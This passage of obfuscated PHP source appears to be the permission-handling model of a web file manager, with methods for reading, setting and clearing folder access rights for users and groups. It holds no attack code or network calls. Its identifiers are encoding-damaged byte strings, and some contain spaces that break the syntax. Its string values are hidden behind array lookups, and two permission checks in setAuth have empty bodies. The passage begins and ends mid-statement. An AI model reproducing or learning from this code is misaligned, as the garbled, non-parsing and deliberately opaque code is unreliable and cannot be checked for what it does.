$ó””­¶[$Ú»ÀÓŸ‘[443]], $Ú»ÀÓŸ‘[32] => $ó””­¶[$Ú»ÀÓŸ‘[32]], $Ú»ÀÓŸ‘[194] => $ó””­¶[$Ú»ÀÓŸ‘[194]], $Ú»ÀÓŸ‘[33] => isset($ó””­¶[$Ú»ÀÓŸ‘[33]]) ? $ó””­¶[$Ú»ÀÓŸ‘[33]] : 1, $Ú»ÀÓŸ‘[2343] => isset($ó””­¶[$Ú»ÀÓŸ‘[2343]]) ? $ó””­¶[$Ú»ÀÓŸ‘[2343]] : 0, $Ú»ÀÓŸ‘[809] => 0, $Ú»ÀÓŸ‘[210] => 0); return parent::insert($¤ÖÔÂ®“); } public function userNoticeEdit($ñ±¯şÉ³, $®¯›Ğ¸¤) { $this->initUserOption(); return parent::update($ñ±¯şÉ³, $®¯›Ğ¸¤); } } goto Eµ„ª¯¨£˜; CºİÈ¨ÈÏ: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\162\143\145\x5f\141\x75\x74\150"; public function getAuth($Õèü€Ä­) { $èÀŠ¯¡ =& $_SERVER[íû‘ş´]; $ÖŒÕ¥é = $this->sourceAuthSelect($Õèü€Ä­); $·•½Ô“ø = array(); $Şó†Óøê = array(); $ÖôÀ„´ = 2 << 25; foreach ($ÖŒÕ¥é as $çÃ—â€®) { $ó™ß¢¢‘ = Model($èÀŠ¯¡[550])->listData($çÃ—â€®[$èÀŠ¯¡[2007]]); if (!$ó™ß¢¢‘) { continue; } $·•½Ô“ø[] = $çÃ—â€®; $Úö––Üö = 0; if ($çÃ—â€®[$èÀŠ¯¡[178]] == SourceModel::TYPE_GROUP) { $Úö––Üö = $ÖôÀ„´ * 2; } if ($çÃ—â€®[$èÀŠ¯¡[178]] == SourceModel::TYPE_USER) { $Úö––Üö = $ÖôÀ„´; } if ($çÃ—â€®[$èÀŠ¯¡[178]] == SourceModel::TYPE_USER && $çÃ—â€®[$èÀŠ¯¡[548]] == $èÀŠ¯¡[212]) { $Úö––Üö = 0; } $Şó†Óøê[] = $ó™ß¢¢‘[$èÀŠ¯¡[464]] + $Úö––Üö; } array_multisort($Şó†Óøê, SORT_DESC, $·•½Ô“ø); return $·•½Ô“ø; } public function sourceAuthSelect($”“š™Å) { $ûŸøÍôç =& $_SERVER[íû‘ş´]; static $í•â¾å = array(); $Ê—¾›Ò‚ = is_array($”“š™Å) ? !1 : !0; if ($Ê—¾›Ò‚) { $”“š™Å = array($”“š™Å); } $½È‰‰¿ı = array(); foreach ($”“š™Å as $×–¾µ€) { if (isset($í•â¾å[$×–¾µ€])) { $½È‰‰¿ı[$×–¾µ€] = $í•â¾å[$×–¾µ€]; } } if (count($½È‰‰¿ı) == count($”“š™Å)) { return $Ê—¾›Ò‚ ? $½È‰‰¿ı[$”“š™Å[0]] : $½È‰‰¿ı; } $«Ÿáùğ = $ûŸøÍôç[2084]; $Çœ´ÅÀŸ = array($ûŸøÍôç[181] => array($ûŸøÍôç[7], $”“š™Å)); $ ´¯´Åâ = $this->field($«Ÿáùğ)->order($ûŸøÍôç[443])->where($Çœ´ÅÀŸ)->select(); $øÀ—¡’ = array_to_keyvalue_group($ ´¯´Åâ, $ûŸøÍôç[181]); foreach ($”“š™Å as $×–¾µ€) { $í•â¾å[$×–¾µ€] = $øÀ—¡’[$×–¾µ€] ? $øÀ—¡’[$×–¾µ€] : array(); } if ($Ê—¾›Ò‚) { return $ ´¯´Åâ; } return $øÀ—¡’; } public function setAuth($§ŠÖº»£, $‹ãëëÖÌ) { $ì­ Ê¡İ =& $_SERVER[íû‘ş´]; $‰§€†šå = Model($ì­ Ê¡İ[1390])->sourceInfo($§ŠÖº»£); if (!$‰§€†šå) { return !1; } if ($‰§€†šå[$ì­ Ê¡İ[178]] != SourceModel::TYPE_GROUP) { return !1; } $î…©Ü©¢ = 1; $Ì ÷º±³ = $‰§€†šå[$ì­ Ê¡İ[548]]; if ($Ì ÷º±³ != $î…©Ü©¢) { $è¢¨Ÿœƒ = array($ì­ Ê¡İ[1903] => $Ì ÷º±³); $ôı”²Ò = Model($ì­ Ê¡İ[1993])->field($ì­ Ê¡İ[1705])->where($è¢¨Ÿœƒ)->select(); $ôı”²Ò = array_to_keyvalue($ôı”²Ò, $ì­ Ê¡İ[12], $ì­ Ê¡İ[1705]); } $Ğ´ğòññ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $£ÖÔ¸ºŒ = array(); foreach ($‹ãëëÖÌ as $İşº‘¦µ) { if (!in_array($İşº‘¦µ[$ì­ Ê¡İ[178]], $Ğ´ğòññ)) { show_json(LNG($ì­ Ê¡İ[2085]), !1); } if ($Ì ÷º±³ != $î…©Ü©¢) { if ($İşº‘¦µ[$ì­ Ê¡İ[178]] == SourceModel::TYPE_GROUP) { } if ($İşº‘¦µ[$ì­ Ê¡İ[548]] != 0 && !in_array($İşº‘¦µ[$ì­ Ê¡İ[548]], $ôı”²Ò)) { } } if ($İşº‘¦µ[$ì­ Ê¡İ[548]] == 0) { $İşº‘¦µ[$ì­ Ê¡İ[178]] = SourceModel::TYPE_USER; } $£ÖÔ¸ºŒ[] = array($ì­ Ê¡İ[181] => $§ŠÖº»£, $ì­ Ê¡İ[178] => intval($İşº‘¦µ[$ì­ Ê¡İ[178]]), $ì­ Ê¡İ[548] => intval($İşº‘¦µ[$ì­ Ê¡İ[548]]), $ì­ Ê¡İ[2007] => intval($İşº‘¦µ[$ì­ Ê¡İ[2007]]) ? intval($İşº‘¦µ[$ì­ Ê¡İ[2007]]) : 0, $ì­ Ê¡İ[2067] => intval($İşº‘¦µ[$ì­ Ê¡İ[2067]]) ? intval($İşº‘¦µ[$ì­ Ê¡İ[2067]]) : -1); } $this->where(array($ì­ Ê¡İ[468] => $§ŠÖº»£))->delete(); $this->addAll($£ÖÔ¸ºŒ); return !0; } public function authClear($Ûî£×şÇ) { $É—’–½ =& $_SERVER[íû‘ş´]; $™ù»Ÿ•÷ = Model($É—’–½[1390])->sourceInfo($Ûî£×şÇ); $ıÏ„€¥ = array($Ûî£×şÇ); if ($™ù»Ÿ•÷[$É—’–½[462]] == $É—’–½[88]) { $Ìãèå†­ = array($É—’–½[630] => array($É—’–½[590], $™ù»Ÿ•÷[$É—’–½[563]] . $Ûî£×şÇ . $É—’–½[591])); $ıÏ„€¥ = Model($É—’–½[1390])->field($É—’–½[468])->where($Ìãèå†­)->getField($É—’–½[181], !0); $ıÏ„€¥[] = $Ûî£×şÇ; } $this->where(array($É—’–½[468] => array($É—’–½[469], $ıÏ„€¥)))->delete(); return !0; } public function getAllChildren($öÕêä¼) { $´™œÙÜÍ =& $_SERVER[íû‘ş´]; $ï†¼İé = Model($´™œÙÜÍ[1390])->sourceInfo($öÕêä¼); if ($ï†¼İé[$´™œÙÜÍ[462]] != $´™œÙÜÍ[88]) { return $this->sourceListAuth(array($öÕêä¼)); } if ($ï†¼İé[$´™œÙÜÍ[178]] != SourceModel::TYPE_GROUP) { return array(); } $¬¦°¬¸Æ = 1; $£–ªœ¡š = array($öÕêä¼); if ($ï†¼İé[$´™œÙÜÍ[180]] == $´™œÙÜÍ[212] && $ï†¼İé[$´™œÙÜÍ[548]] != $¬¦°¬¸Æ) { $£–ªœ¡š = $this->groupChidldAllRootSource($ï†¼İé[$´™œÙÜÍ[548]]); } $Ò½ïô¶ = $this->field($´™œÙÜÍ[181])->group($´™œÙÜÍ[181])->select(); $Ò½ïô¶ = array_to_keyvalue($Ò½ïô¶, $´™œÙÜÍ[12], $´™œÙÜÍ[181]); if (!$Ò½ïô¶) { return array(); } $ØÎ·÷ë¼ = $´™œÙÜÍ[2086]; $‰æÁ—¢“ = array($´™œÙÜÍ[181] => array($´™œÙÜÍ[7], $Ò½ïô¶), $´™œÙÜÍ[482] => $´™œÙÜÍ[212]); $Ó«Î¶ = Model($´™œÙÜÍ[884])->field($ØÎ·÷ë¼)->where($‰æÁ—¢“)->select(); $Ğ°ùÌ®ã = array($öÕêä¼); foreach ($Ó«Î¶ as $¡¯²Ûñ´) { foreach ($£–ªœ¡š as $¢¥‚ò¨) { $šú ¶‰æ = $´™œÙÜÍ[50] . $¢¥‚ò¨ . $´™œÙÜÍ[50]; $ª«¤ó“ = $¡¯²Ûñ´[$´™œÙÜÍ[563]] . $¡¯²Ûñ´[$´™œÙÜÍ[181]] . $´™œÙÜÍ[50]; if (strstr($ª«¤ó“, $šú ¶‰æ)) { $Ğ°ùÌ®ã[] = $¡¯²Ûñ´[$´™œÙÜÍ[181]]; break; } } } return $this->sourceListAuth($Ğ°ùÌ®ã); } private function sourceListAuth($‚ éÁ¶×) { $÷´…ä—ğ =& $_SERVER[íû‘ş´]; $©®úÆõ = Model($÷´…ä—ğ[1390])->sourceListInfo($‚ éÁ¶×, !0); $¥éØ„Ø³ = $this->sourceAuthSelect($‚ éÁ¶×); $ğÛÄóü = array(); $ÍĞ™Áı = array(); foreach ($©®úÆõ as $°é™‹Äı) { unset($°é™‹Äı[$÷´…ä—ğ[506]]); unset($°é™‹Äı[$÷´…ä—ğ[504]]); unset($°é™‹Äı[$÷´…ä—ğ[464]]); unset($°é™‹Äı[$÷´…ä—ğ[87]]); $šİÌ”æ = $¥éØ„Ø³[$°é™‹Äı[$÷´…ä—ğ[181]]]; if (!$šİÌ”æ) { continue; } $°é™‹Äı[$÷´…ä—ğ[2087]] = $this->authTargetInfo($šİÌ”æ); $°é™‹Äı[$÷´…ä—ğ[561]] = rtrim($°é™‹Äı[$÷´…ä—ğ[567]], $÷´…ä—ğ[8]) . $÷´…ä—ğ[8] . ltrim($°é™‹Äı[$÷´…ä—ğ[561]], $÷´…ä—ğ[8]); $ğÛÄóü[] = $°é™‹Äı; $™ÙÎ¸ëæ = count(explode($÷´…ä—ğ[8], trim($°é™‹Äı[$÷´…ä—ğ[561]], $÷´…ä—ğ[8]))); $ÍĞ™Áı[] = $™ÙÎ¸ëæ + ($°é™‹Äı[$÷´…ä—ğ[33]] == $÷´…ä—ğ[75] ? 0 : 1000); } array_multisort($ÍĞ™Áı, SORT_ASC, $ğÛÄóü); return $ğÛÄóü; } private function groupChidldAllRootSource($äÖ¿œ¤û) { $š¥¹¹öÕ =& $_SERVER[íû‘ş´]; $šõíİ‚ = Model($š¥¹¹öÕ[2088])->groupChildrenAll($äÖ¿œ¤û); $€±úÇëº = array($š¥¹¹öÕ[180] => 0, $š¥¹¹öÕ[548] => array($š¥¹¹öÕ[7], $šõíİ‚), $š¥¹¹öÕ[178] => SourceModel::TYPE_GROUP); $ìôÎí¡Ô = Model($š¥¹¹öÕ[884])->field($š¥¹¹öÕ[181])->where($€±úÇëº)->select(); $ìôÎí¡Ô = array_to_keyvalue($ìôÎí¡Ô, $š¥¹¹öÕ[12], $š¥¹¹öÕ[181]); return $ìôÎí¡Ô; } private function authTargetInfo($¢½ˆßìµ) { $ç¦¦©© =& $_SERVER[íû‘ş´]; $È¸Úì†÷ = array(); $ÚÜ¥ü„ = array(); $‚Œâ¦üì = 2 << 25; foreach ($¢½ˆßìµ as $íÕµ¬²·) { $³‚Û¾ó• = Model($ç¦¦©©[550])->listData($íÕµ¬²·[$ç¦¦©©[2007]]); if (!$³‚Û¾ó•) { continue; } if ($íÕµ¬²·[$ç¦¦©©[178]] == SourceModel::TYPE_USER) { $ úòÔ³ = Model($ç¦¦©©[556])->getInfoSimpleOuter($íÕµ¬²·[$ç¦¦©©[548]]); if ($ úòÔ³[$ç¦¦©©[1705]] == $ç¦¦©©[1246]) { continue; } if ($ úòÔ³[$ç¦¦©©[1705]] == $ç¦¦©©[212]) { $ úòÔ³[$ç¦¦©©[32]] = LNG($ç¦¦©©[2089]); } } else { $ úòÔ³ = Model($ç¦¦©©[564])->getInfoSimple($íÕµ¬²·[$ç¦¦©©[548]]); } if (!$ úòÔ³) { continue; } $ úòÔ³[$ç¦¦©©[517]] = $³‚Û¾ó•; $È¸Úì†÷[] = $ úòÔ³; $Ê×Ó½İù = 0; if ($íÕµ¬²·[$ç¦¦©©[178]] == SourceModel::TYPE_GROUP) { $Ê×Ó½İù = $‚Œâ¦üì * 2; } if ($íÕµ¬²·[$ç¦¦©©[178]] == SourceModel::TYPE_USER) { $Ê×Ó½İù = $‚Œâ¦üì; } if ($íÕµ¬²·[$ç¦¦©©[178]] == SourceModel::TYPE_USER && $íÕµ¬²·[$ç¦¦©©[548]] == $ç¦¦©©[212]) { $Ê×Ó½İù = 0; } $ÚÜ¥ü„[] = $³‚Û¾ó•[$ç¦¦©©[464]] + $Ê×Ó½İù; } array_multisort($ÚÜ¥ü„, SORT_DESC, $È¸Úì†÷); return $È¸Úì†÷; } public function getAllChildrenByUser($¦õÌİäÅ, $ñºÓ§ƒ„) { $Óƒ‡³¬ =& $_SERVER[íû‘ş´]; $ì©á¨ù¤ = Model($Óƒ‡³¬[577])->getInfo($ñºÓ§ƒ„); if (!$ñºÓ§ƒ„ || !$¦õÌİäÅ || !$ì©á¨ù¤) { return array(); } $ğ±íÃ¡² = Model($Óƒ‡³¬[1390])->sourceInfo($¦õÌİäÅ); $š”³æ°Î = array(); $Åå‚ŸÁë = 1; if ($ğ±íÃ¡²[$Óƒ‡³¬[180]] == $Óƒ‡³¬[212] && $ğ±íÃ¡²[$Óƒ‡³¬[548]] != $Åå‚ŸÁë && $this->groupContainUser($ğ±íÃ¡²[$Óƒ‡³¬[548]], $ñºÓ§ƒ„)) { foreach ($ì©á¨ù¤[$Óƒ‡³¬[2090]] as $±ô“Ñ™º) { $ìÆ‹ıŸ· = Model($Óƒ‡³¬[564])->getInfo($±ô“Ñ™º[$Óƒ‡³¬[1903]]); $¨—øë¯ç = Model($Óƒ‡³¬[577])->getInfoSimpleOuter($ñºÓ§ƒ„); $¨—øë¯ç[$Óƒ‡³¬[517]] = $±ô“Ñ™º[$Óƒ‡³¬[464]]; if (Model($Óƒ‡³¬[550])->authCheckAction($±ô“Ñ™º[$Óƒ‡³¬[464]][$Óƒ‡³¬[464]], $Óƒ‡³¬[1924])) { continue; } $ °Í…‰ = array($Óƒ‡³¬[32] => $Óƒ‡³¬[1266] . $ìÆ‹ıŸ·[$Óƒ‡³¬[32]], $Óƒ‡³¬[181] => $ìÆ‹ıŸ·[$Óƒ‡³¬[87]][$Óƒ‡³¬[181]], $Óƒ‡³¬[84] => KodIO::make($ìÆ‹ıŸ·[$Óƒ‡³¬[87]][$Óƒ‡³¬[181]]), $Óƒ‡³¬[180] => $Óƒ‡³¬[212], $Óƒ‡³¬[178] => $Óƒ‡³¬[557], $Óƒ‡³¬[33] => $Óƒ‡³¬[594], $Óƒ‡³¬[561] => $ìÆ‹ıŸ·[$Óƒ‡³¬[568]], $Óƒ‡³¬[1903] => $ìÆ‹ıŸ·[$Óƒ‡³¬[1903]], $Óƒ‡³¬[565] => $ìÆ‹ıŸ·[$Óƒ‡³¬[180]], $Óƒ‡³¬[2087] => array($¨—øë¯ç)); $š”³æ°Î[$ °Í…‰[$Óƒ‡³¬[181]]] = $ °Í…‰; } } $è…Ï¹¥ = array(); $î¹İ–Ÿ÷ = $this->getAllChildren($¦õÌİäÅ); foreach ($î¹İ–Ÿ÷ as $×¶Èúû) { $ñ€‰°¸ = !1; foreach ($×¶Èúû[$Óƒ‡³¬[2087]] as $èŞ«çñË) { if ($èŞ«çñË[$Óƒ‡³¬[1705]]) { if ($èŞ«çñË[$Óƒ‡³¬[1705]] == $ñºÓ§ƒ„) { $ñ€‰°¸ = !0; break; } } if ($èŞ«çñË[$Óƒ‡³¬[1903]]) { if ($this->groupContainUser($èŞ«çñË[$Óƒ‡³¬[1903]], $ñºÓ§ƒ„)) { $ñ€‰°¸ = !0; break; } } } if ($ñ€‰°¸) { $è…Ï¹¥[] = $×¶Èúû; } $¯Á£©üõ = $×¶Èúû[$Óƒ‡³¬[181]]; if (isset($š”³æ°Î[$¯Á£©üõ])) { $×¶Èúû[$Óƒ‡³¬[2087]][] = $š”³æ°Î[$¯Á£©üõ][0]; $š”³æ°Î[$¯Á£©üõ] = !1; } } $š”³æ°Î = array_filter(array_values($š”³æ°Î)); $è…Ï¹¥ = array_merge($š”³æ°Î, $è…Ï¹¥); return $è…Ï¹¥; } public function setAllChildrenByUser($Ì˜âÕà, $ÂŠ±Ï¹÷, $Ú•Í¡â) { $ªÙ±Ëä =& $_SERVER[íû‘ş´]; $× šµ“¬ = $this->getAllChildrenByUser($Ì˜âÕà, $ÂŠ±Ï¹÷); if (!$Ú•Í¡â || !$× šµ“¬) { return !1; } foreach ($× šµ“¬ as $Û¶˜Úêõ) { $Œšµåª = array(); foreach ($Û¶˜Úêõ[$ªÙ±Ëä[2087]] as $Î–öã–¶) { $şÒ–Àú„ = $Î–öã–¶[$ªÙ±Ëä[517]]; $ñéÛ–ç = $Î–öã–¶[$ªÙ±Ëä[1705]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $±¢–ÉåÆ = $Î–öã–¶[$ªÙ±Ëä[1705]] ? $Î–öã–¶[$ªÙ±Ëä[1705]] : $Î–öã–¶[$ªÙ±Ëä[1903]]; if ($Î–öã–¶[$ªÙ±Ëä[1705]] && $Î–öã–¶[$ªÙ±Ëä[1705]] == $ÂŠ±Ï¹÷) { continue; } $Œšµåª[] = array($ªÙ±Ëä[181] => $Û¶˜Úêõ[$ªÙ±Ëä[181]], $ªÙ±Ëä[178] => $ñéÛ–ç, $ªÙ±Ëä[548] => intval($±¢–ÉåÆ), $ªÙ±Ëä[2007] => isset($şÒ–Àú„[$ªÙ±Ëä[443]]) ? intval($şÒ–Àú„[$ªÙ±Ëä[443]]) : 0, $ªÙ±Ëä[2067] => isset($şÒ–Àú„[$ªÙ±Ëä[2067]]) ? intval($şÒ–Àú„[$ªÙ±Ëä[2067]]) : -1); } $Œšµåª[] = array($ªÙ±Ëä[181] => $Û¶˜Úêõ[$ªÙ±Ëä[181]], $ªÙ±Ëä[178] => SourceModel::TYPE_USER, $ªÙ±Ëä[548] => intval($ÂŠ±Ï¹÷), $ªÙ±Ëä[2007] => intval($Ú•Í¡â), $ªÙ±Ëä[2067] => -1); $this->where(array($ªÙ±Ëä[468] => $Û¶˜Úêõ[$ªÙ±Ëä[181]]))->delete(); $this->addAll($Œšµåª); } return !0; } public function get($Ü›šê…») { $´çŞ¾ã = $this->getSourceList(array($Ü›šê…»), !0); return $´çŞ¾ã[0]; } public function getSourceList($Ø´²ªá, $š½‘ï¼ = false, $¨ÌÀ«…® = false) { $öÑà—Šñ =& $_SERVER[íû‘ş´]; if (!$Ø´²ªá) { return array(); } $®éÏÍÒÊ = Model($öÑà—Šñ[1390]); if (!$š½‘ï¼ && count($Ø´²ªá) == 1) { $š½‘ï¼ = array(); $š½‘ï¼[$Ø´²ªá[0]] = $®éÏÍÒÊ->sourceInfo($Ø´²ªá[0]); } if (!$š½‘ï¼) { $·±´ªÍ = array($öÑà—Šñ[468] => array($öÑà—Šñ[469], $Ø´²ªá)); $š½‘ï¼ = $®éÏÍÒÊ->field($öÑà—Šñ[2091])->where($·±´ªÍ)->select(); $š½‘ï¼ = array_to_keyvalue($š½‘ï¼, $öÑà—Šñ[181]); } $Ñşµ¸”ƒ = $Ø´²ªá; foreach ($š½‘ï¼ as $‡¾Ï•ÆŒ => $»†àß¼ù) { $–‰“÷÷ = $®éÏÍÒÊ->parentLevelArray($»†àß¼ù[$öÑà—Šñ[563]]); $Ñşµ¸”ƒ = array_merge($Ñşµ¸”ƒ, array($‡¾Ï•ÆŒ), array_reverse($–‰“÷÷)); } $Ñşµ¸”ƒ = array_values(array_unique($Ñşµ¸”ƒ)); if (!$Ñşµ¸”ƒ) { return array(); } $ôÜ€âŸ‘ = $this->sourceAuthSelect($Ñşµ¸”ƒ); $ú¬…ö× = array(); foreach ($Ñşµ¸”ƒ as $ó®ïš“) { if (isset($ôÜ€âŸ‘[$ó®ïš“])) { $ú¬…ö×[$ó®ïš“] = $ôÜ€âŸ‘[$ó®ïš“]; } } $¼Š˜§Üş = $this->userIsRoot($¨ÌÀ«…®); $Ä—²¶ó¡ = AuthModel::authAll(); $íÑÖ§ü = array($öÑà—Šñ[465] => $Ä—²¶ó¡, $öÑà—Šñ[2092] => array($öÑà—Šñ[470] => 0, $öÑà—Šñ[1909] => $Ä—²¶ó¡, $öÑà—Šñ[471] => LNG($öÑà—Šñ[2093]), $öÑà—Šñ[1926] => $öÑà—Šñ[2094])); $¾ôüéÌö = array(); foreach ($š½‘ï¼ as $ó®ïš“ => $ÅıôÍè’) { if ($¼Š˜§Üş && $GLOBALS[$öÑà—Šñ[6]][$öÑà—Šñ[1922]]) { $¾ôüéÌö[$ó®ïš“] = $íÑÖ§ü; continue; } $¾ôüéÌö[$ó®ïš“] = $this->makeSourceAuth($ÅıôÍè’, $ú¬…ö×, $¨ÌÀ«…®); } return $¾ôüéÌö; } public function authDeepCheck($•õÛ«ü—, $ĞÒ™¬Äğ = false) { $÷Ïèõ½Í =& $_SERVER[íû‘ş´]; $ĞÒ™¬Äğ = $ĞÒ™¬Äğ ? $ĞÒ™¬Äğ : USER_ID; $èĞÊï” = $this->makeAuthDeep($ĞÒ™¬Äğ); if (!in_array($•õÛ«ü—, $èĞÊï”[$÷Ïèõ½Í[2095]])) { return !1; } $Ëşó€˜ = array(); foreach ($èĞÊï”[$÷Ïèõ½Í[2096]] as $é‘–”Ç¸ => $¢Ÿ°Ï•Ó) { if (!in_array($•õÛ«ü—, $¢Ÿ°Ï•Ó)) { continue; } $Ëşó€˜[] = $é‘–”Ç¸; } if (!$Ëşó€˜) { return !1; } $Óö›²ßÏ = $Ëşó€˜ ? $Ëşó€˜[0] : $•õÛ«ü—; return array($÷Ïèõ½Í[465] => -1, $÷Ïèõ½Í[517] => array($÷Ïèõ½Í[470] => $÷Ïèõ½Í[1246], $÷Ïèõ½Í[1909] => $÷Ïèõ½Í[212], $÷Ïèõ½Í[471] => LNG($÷Ïèõ½Í[2097]), $÷Ïèõ½Í[1926] => $÷Ïèõ½Í[2098]), $÷Ïèõ½Í[2099] => LNG($÷Ïèõ½Í[2100]), $÷Ïèõ½Í[2101] => $this->sourceAuthInfo($Óö›²ßÏ)); } protected function makeAuthDeep($İ«È˜É­ = false) { $Òµ‚Â =& $_SERVER[íû‘ş´]; static $Ï»§×Û = array(); $İ«È˜É­ = $İ«È˜É­ ? $İ«È˜É­ : USER_ID; if (isset($Ï»§×Û[$İ«È˜É­])) { return $Ï»§×Û[$İ«È˜É­]; } $«ëŞŞş÷ = Model($Òµ‚Â[2102])->listData(); $¹®…·ˆ = array(); foreach ($«ëŞŞş÷ as $ËÜˆÒ½¾) { if ($ËÜˆÒ½¾[$Òµ‚Â[464]] == 0 && $ËÜˆÒ½¾[$Òµ‚Â[1925]] == $Òµ‚Â[88]) { $¹®…·ˆ[] = $ËÜˆÒ½¾[$Òµ‚Â[443]]; } } $İøòë†‘ = $this->userGroupParents($İ«È˜É­); $ÅŞÛ°Êê = array($Òµ‚Â[178] => SourceModel::TYPE_USER, $Òµ‚Â[548] => $İ«È˜É­); if ($İøòë†‘) { $ÅŞÛ°Êê = array(array($Òµ‚Â[178] => SourceModel::TYPE_USER, $Òµ‚Â[548] => $İ«È˜É­), array($Òµ‚Â[178] => SourceModel::TYPE_GROUP, $Òµ‚Â[548] => array($Òµ‚Â[469], $İøòë†‘)), $Òµ‚Â[1058] => $Òµ‚Â[2001]); } $ÌÂ‚¾¶® = $this->field($Òµ‚Â[2103])->where($ÅŞÛ°Êê)->select(); $÷ŒÁöõÙ = array(); $°µŒ‹ı = array_to_keyvalue_group($ÌÂ‚¾¶®, $Òµ‚Â[181]); foreach ($°µŒ‹ı as $ûâò‰©Î => $¢ñËøÂí) { $Õñş¢™ = $this->authArrayCheck($¢ñËøÂí, $İ«È˜É­); if ($Õñş¢™[$Òµ‚Â[465]] > 0) { $÷ŒÁöõÙ[] = $ûâò‰©Î . $Òµ‚Â[12]; } } if ($İøòë†‘) { $¥ù÷Ê¬å = Model($Òµ‚Â[564]); foreach ($İøòë†‘ as $ù—ø¥Ô²) { $¡Éª£µÓ = $¥ù÷Ê¬å->getInfo($ù—ø¥Ô²); if (!$¡Éª£µÓ || !is_array($¡Éª£µÓ[$Òµ‚Â[87]])) { continue; } $÷ŒÁöõÙ[] = $¡Éª£µÓ[$Òµ‚Â[87]][$Òµ‚Â[181]]; } } $İæç’ºš = array(); $ë´ˆ¨ô¢ = $İøòë†‘; $ó›šõü¡ = Model($Òµ‚Â[1390]); $¥ù÷Ê¬å = Model($Òµ‚Â[564]); $ÜÜ†Ã¼Š = array(); $ğØÊˆñ¡ = array(); $»œİ†®§ = array(); $È£‹öÌ™ = array(); if ($÷ŒÁöõÙ) { $¶Î¶”®ò = $ó›šõü¡->where(array($Òµ‚Â[181] => array($Òµ‚Â[469], $÷ŒÁöõÙ)))->select(); foreach ($¶Î¶”®ò as $ÆĞ½ğÆ) { $¢ŞéŸ¤å = $ó›šõü¡->parentLevelArray($ÆĞ½ğÆ[$Òµ‚Â[563]]); $İæç’ºš = array_merge($İæç’ºš, $¢ŞéŸ¤å); $ë´ˆ¨ô¢[] = $ÆĞ½ğÆ[$Òµ‚Â[548]]; $ÜÜ†Ã¼Š[$ÆĞ½ğÆ[$Òµ‚Â[181]]] = $¢ŞéŸ¤å; $ğØÊˆñ¡[$ÆĞ½ğÆ[$Òµ‚Â[181]]] = $ÆĞ½ğÆ[$Òµ‚Â[548]]; } } $ë´ˆ¨ô¢ = array_values(array_unique($ë´ˆ¨ô¢)); $¼ÉŠÍø = $ë´ˆ¨ô¢; foreach ($¼ÉŠÍø as $ù—ø¥Ô²) { $¡Éª£µÓ = $¥ù÷Ê¬å->getInfo($ù—ø¥Ô²); $¢ŞéŸ¤å = $ó›šõü¡->parentLevelArray($¡Éª£µÓ[$Òµ‚Â[563]]); $ë´ˆ¨ô¢ = array_merge($ë´ˆ¨ô¢, $¢ŞéŸ¤å); } $ë´ˆ¨ô¢ = array_values(array_unique($ë´ˆ¨ô¢)); foreach ($ë´ˆ¨ô¢ as $ù—ø¥Ô²) { $¡Éª£µÓ = $¥ù÷Ê¬å->getInfo($ù—ø¥Ô²); $İæç’ºš[] = $¡Éª£µÓ[$Òµ‚Â[87]][$Òµ‚Â[181]]; $»œİ†®§[$ù—ø¥Ô²] = $¡Éª£µÓ[$Òµ‚Â[87]][$Òµ‚Â[181]]; $È£‹öÌ™[$ù—ø¥Ô²] = $ó›šõü¡->parentLevelArray($¡Éª£µÓ[$Òµ‚Â[563]]); } foreach ($ÜÜ†Ã¼Š as $¨é°¨‡Ñ => $á™¨ƒÔ) { $·çÕ§ÈÙ = $ğØÊˆñ¡[$¨é°¨‡Ñ]; if (!$·çÕ§ÈÙ || !$»œİ†®§[$·çÕ§ÈÙ]) { continue; } $ö“ÉëúĞ = array(); foreach ($È£‹öÌ™[$·çÕ§ÈÙ] as $ù—ø¥Ô²) { $ö“ÉëúĞ[] = $»œİ†®§[$ù—ø¥Ô²]; } $ÜÜ†Ã¼Š[$¨é°¨‡Ñ] = array_merge($ö“ÉëúĞ, $á™¨ƒÔ); } $İæç’ºš = array_values(array_unique($İæç’ºš)); $¶’«òĞ¡ = array($Òµ‚Â[2095] => $İæç’ºš, $Òµ‚Â[2096] => $ÜÜ†Ã¼Š); $Ï»§×Û[$İ«È˜É­] = $¶’«òĞ¡; return $¶’«òĞ¡; } private function makeSourceAuth($¤ŞÎÓâÉ, $Íç¹ıœÃ, $²Ñ¸»§Û = false) { $ç®ğ¼â =& $_SERVER[íû‘ş´]; $±¯ÏƒÊ² = $ç®ğ¼â[88]; $œ†­ë»Í = $¤ŞÎÓâÉ[$ç®ğ¼â[548]]; $¶ƒÁç¥ = $¤ŞÎÓâÉ[$ç®ğ¼â[178]] == SourceModel::TYPE_GROUP; $¼øÕ‹ªß = $¶ƒÁç¥ ? $this->groupRootAuth($œ†­ë»Í, $²Ñ¸»§Û) : !1; if ($¼øÕ‹ªß && Model($ç®ğ¼â[550])->authCheckAction($¼øÕ‹ªß[$ç®ğ¼â[464]], $ç®ğ¼â[1924])) { return $this->groupAuthInfo($¼øÕ‹ªß, $œ†­ë»Í); } $ˆûøš¹ = Model($ç®ğ¼â[1390])->parentLevelArray($¤ŞÎÓâÉ[$ç®ğ¼â[563]]); $ˆûøš¹ = array_merge(array($¤ŞÎÓâÉ[$ç®ğ¼â[181]]), array_reverse($ˆûøš¹)); $ÔĞÚ©¡Ï = !1; foreach ($ˆûøš¹ as $á‹Äê÷ú) { if (!isset($Íç¹ıœÃ[$á‹Äê÷ú])) { continue; } $Æ©Üà = $this->authMake($Íç¹ıœÃ[$á‹Äê÷ú], $²Ñ¸»§Û); if ($Æ©Üà[$ç®ğ¼â[517]]) { $ÔĞÚ©¡Ï = $Æ©Üà; break; } } if (!$¶ƒÁç¥) { return $ÔĞÚ©¡Ï; } if (!$ÔĞÚ©¡Ï && $¼øÕ‹ªß) { $ÔĞÚ©¡Ï = $this->groupAuthInfo($¼øÕ‹ªß, $œ†­ë»Í); } if (!$ÔĞÚ©¡Ï) { $¶˜²ôéÇ = Model($ç®ğ¼â[564])->getInfo($œ†­ë»Í); $ÕĞ¹ã„Ï = explode($ç®ğ¼â[50], trim($¶˜²ôéÇ[$ç®ğ¼â[563]], $ç®ğ¼â[50])); $ÕĞ¹ã„Ï = array_reverse($ÕĞ¹ã„Ï); foreach ($ÕĞ¹ã„Ï as $Æ·˜Ñ) { if ($Æ·˜Ñ == $ç®ğ¼â[212] || $Æ·˜Ñ == $±¯ÏƒÊ²) { continue; } $Å›³šƒÔ = $this->groupRootAuth($Æ·˜Ñ, $²Ñ¸»§Û); if (!$Å›³šƒÔ) { continue; } $ÔĞÚ©¡Ï = 